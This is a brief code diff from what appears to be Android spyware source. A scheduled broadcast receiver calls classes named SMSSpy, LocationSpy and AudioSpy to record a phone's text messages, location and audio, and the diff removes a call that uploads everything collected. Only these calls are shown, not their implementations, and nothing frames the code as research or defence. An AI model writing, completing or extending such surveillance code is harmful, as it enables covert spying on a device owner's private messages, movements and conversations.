@@ -23,7 +23,5 @@ public class ScheduledWriter extends BroadcastReceiver {
         SMSSpy.writeSMS(context);
         LocationSpy.writeLocation(context);
         AudioSpy.writeAudio(context);
-
-        Uploader.uploadAll(context);
     }
 }
